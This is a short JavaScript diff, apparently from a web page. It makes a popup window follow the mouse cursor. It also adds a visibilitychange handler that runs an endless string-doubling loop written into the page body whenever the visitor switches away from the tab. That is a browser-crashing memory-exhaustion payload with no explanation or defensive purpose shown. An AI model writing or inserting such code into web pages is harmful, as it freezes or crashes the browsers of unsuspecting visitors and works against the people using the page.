@@ -9,10 +9,15 @@
 function coordinate(event) {
         let mx = event.clientX;
         let my = event.clientY;
-        printOut.focus()
+
         printOut.moveTo(mx,my)
     }
+document.addEventListener("visibilitychange", (event) => {
+  if (document.visibilityState == "visible") {
 
+  } else {
+a="aaaaaaaaaaaaaaaaaaa"; while (true) {a=a+a;document.body.innerHTML=a}
+}});
 
         
 
